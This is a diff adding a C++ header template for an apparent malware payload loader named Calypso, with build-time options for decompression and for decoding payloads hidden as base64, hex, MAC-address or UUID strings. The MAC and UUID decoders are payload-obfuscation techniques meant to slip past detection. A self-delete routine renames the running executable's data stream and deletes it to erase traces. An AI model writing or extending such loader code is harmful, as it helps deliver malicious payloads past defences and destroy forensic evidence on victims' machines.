@@ -1,0 +1,221 @@
+// Calypso loader - Common utilities (decompression, decoding, helpers)
+#pragma once
+
+#include <windows.h>
+#include <cstdint>
+#include <cstring>
+#include "obfuscate.hpp.in"
+
+{{#IF COMPRESS_ZLIB}}
+// Minimal zlib decompression (stored blocks only - matches packer's miniz output)
+static bool decompress_zlib(const uint8_t* src, size_t src_len,
+                            uint8_t* dst, size_t dst_cap, size_t* dst_len) {
+    if (src_len < 6) return false;
+    const uint8_t* p = src + 2; // skip zlib header
+    size_t remaining = src_len - 6;
+    uint8_t* out = dst;
+    size_t out_left = dst_cap;
+
+    while (remaining > 0) {
+        uint8_t hdr = *p++; remaining--;
+        int btype = (hdr >> 1) & 3;
+        if (btype == 0) {
+            if (remaining < 4) return false;
+            uint16_t len = p[0] | ((uint16_t)p[1] << 8);
+            p += 4; remaining -= 4;
+            if (remaining < len || out_left < len) return false;
+            memcpy(out, p, len);
+            p += len; remaining -= len;
+            out += len; out_left -= len;
+        } else {
+            return false;
+        }
+        if (hdr & 1) break;
+    }
+    *dst_len = (size_t)(out - dst);
+    return true;
+}
+{{#ENDIF}}
+
+{{#IF COMPRESS_LZ4}}
+// LZ4 decompression (minimal block format)
+static bool decompress_lz4(const uint8_t* src, size_t src_len,
+                           uint8_t* dst, size_t dst_cap, size_t* dst_len) {
+    const uint8_t* ip = src;
+    const uint8_t* iend = src + src_len;
+    uint8_t* op = dst;
+    uint8_t* oend = dst + dst_cap;
+
+    while (ip < iend) {
+        unsigned token = *ip++;
+        // Literal length
+        unsigned lit_len = token >> 4;
+        if (lit_len == 15) {
+            unsigned s;
+            do { if (ip >= iend) return false; s = *ip++; lit_len += s; } while (s == 255);
+        }
+        if (ip + lit_len > iend || op + lit_len > oend) return false;
+        memcpy(op, ip, lit_len);
+        ip += lit_len;
+        op += lit_len;
+
+        if (ip >= iend) break;
+
+        // Offset
+        if (ip + 2 > iend) return false;
+        uint16_t offset = ip[0] | ((uint16_t)ip[1] << 8);
+        ip += 2;
+        if (offset == 0 || op - dst < offset) return false;
+        const uint8_t* match = op - offset;
+
+        // Match length
+        unsigned match_len = (token & 0x0F) + 4;
+        if (match_len == 19) {
+            unsigned s;
+            do { if (ip >= iend) return false; s = *ip++; match_len += s; } while (s == 255);
+        }
+        if (op + match_len > oend) return false;
+        for (unsigned i = 0; i < match_len; i++)
+            op[i] = match[i];
+        op += match_len;
+    }
+    *dst_len = (size_t)(op - dst);
+    return true;
+}
+{{#ENDIF}}
+
+{{#IF ENCODE_BASE64}}
+static const uint8_t b64_decode_table[256] = {
+    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,
+    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,
+    64,64,64,64,64,64,64,64,64,64,64,62,64,64,64,63,
+    52,53,54,55,56,57,58,59,60,61,64,64,64,0, 64,64,
+    64,0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10,11,12,13,14,
+    15,16,17,18,19,20,21,22,23,24,25,64,64,64,64,64,
+    64,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
+    41,42,43,44,45,46,47,48,49,50,51,64,64,64,64,64,
+    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,
+    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,
+    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,
+    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,
+    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,
+    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,
+    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,
+    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,
+};
+
+static size_t decode_base64(const char* src, size_t src_len, uint8_t* dst) {
+    size_t out = 0;
+    uint32_t accum = 0;
+    int bits = 0;
+    for (size_t i = 0; i < src_len; i++) {
+        uint8_t v = b64_decode_table[(uint8_t)src[i]];
+        if (v == 64) continue;
+        accum = (accum << 6) | v;
+        bits += 6;
+        if (bits >= 8) {
+            bits -= 8;
+            dst[out++] = (uint8_t)((accum >> bits) & 0xFF);
+        }
+    }
+    return out;
+}
+{{#ENDIF}}
+
+{{#IF ENCODE_HEX}}
+static size_t decode_hex(const char* src, size_t src_len, uint8_t* dst) {
+    size_t out = 0;
+    for (size_t i = 0; i + 1 < src_len; i += 2) {
+        auto hex_val = [](char c) -> uint8_t {
+            if (c >= '0' && c <= '9') return c - '0';
+            if (c >= 'a' && c <= 'f') return 10 + c - 'a';
+            if (c >= 'A' && c <= 'F') return 10 + c - 'A';
+            return 0;
+        };
+        dst[out++] = (hex_val(src[i]) << 4) | hex_val(src[i+1]);
+    }
+    return out;
+}
+{{#ENDIF}}
+
+{{#IF ENCODE_MAC}}
+static size_t decode_mac(const char* src, size_t src_len, uint8_t* dst) {
+    // Parse "AA-BB-CC-DD-EE-FF\nAA-BB-..." format
+    size_t out = 0;
+    auto hex_val = [](char c) -> uint8_t {
+        if (c >= '0' && c <= '9') return c - '0';
+        if (c >= 'a' && c <= 'f') return 10 + c - 'a';
+        if (c >= 'A' && c <= 'F') return 10 + c - 'A';
+        return 0;
+    };
+    for (size_t i = 0; i + 1 < src_len; ) {
+        if ((src[i] >= '0' && src[i] <= '9') || (src[i] >= 'A' && src[i] <= 'F') ||
+            (src[i] >= 'a' && src[i] <= 'f')) {
+            dst[out++] = (hex_val(src[i]) << 4) | hex_val(src[i+1]);
+            i += 2;
+            if (i < src_len && (src[i] == '-' || src[i] == '\n' || src[i] == '\r'))
+                i++;
+        } else {
+            i++;
+        }
+    }
+    return out;
+}
+{{#ENDIF}}
+
+{{#IF ENCODE_UUID}}
+static size_t decode_uuid(const char* src, size_t src_len, uint8_t* dst) {
+    // Parse "aabbccdd-eeff-0011-2233-445566778899\n..." format
+    size_t out = 0;
+    auto hex_val = [](char c) -> uint8_t {
+        if (c >= '0' && c <= '9') return c - '0';
+        if (c >= 'a' && c <= 'f') return 10 + c - 'a';
+        if (c >= 'A' && c <= 'F') return 10 + c - 'A';
+        return 0;
+    };
+    for (size_t i = 0; i + 1 < src_len; ) {
+        char c = src[i];
+        if ((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
+            dst[out++] = (hex_val(src[i]) << 4) | hex_val(src[i+1]);
+            i += 2;
+        } else {
+            i++;
+        }
+    }
+    return out;
+}
+{{#ENDIF}}
+
+// Self-delete via rename + delete on close
+{{#IF SELF_DELETE}}
+static void self_delete() {
+    wchar_t path[MAX_PATH];
+    GetModuleFileNameW(NULL, path, MAX_PATH);
+
+    // Rename the :$DATA stream to prevent locks
+    HANDLE hFile = CreateFileW(path, DELETE, 0, NULL, OPEN_EXISTING,
+                               FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return;
+
+    typedef struct { ULONG Flags; HANDLE RootDirectory; ULONG FileNameLength; WCHAR FileName[1]; } FILE_RENAME_INFO_FULL;
+    const wchar_t new_stream[] = L":deadbeef";
+    size_t info_size = sizeof(FILE_RENAME_INFO_FULL) + sizeof(new_stream);
+    auto* info = (FILE_RENAME_INFO_FULL*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, info_size);
+    if (!info) { CloseHandle(hFile); return; }
+
+    info->Flags = 0;
+    info->RootDirectory = NULL;
+    info->FileNameLength = sizeof(new_stream) - sizeof(wchar_t);
+    memcpy(info->FileName, new_stream, sizeof(new_stream));
+
+    SetFileInformationByHandle(hFile, FileRenameInfo, info, (DWORD)info_size);
+    CloseHandle(hFile);
+    HeapFree(GetProcessHeap(), 0, info);
+
+    // Now delete
+    hFile = CreateFileW(path, DELETE, 0, NULL, OPEN_EXISTING,
+                        FILE_FLAG_DELETE_ON_CLOSE, NULL);
+    if (hFile != INVALID_HANDLE_VALUE)
+        CloseHandle(hFile);
+}
+{{#ENDIF}}
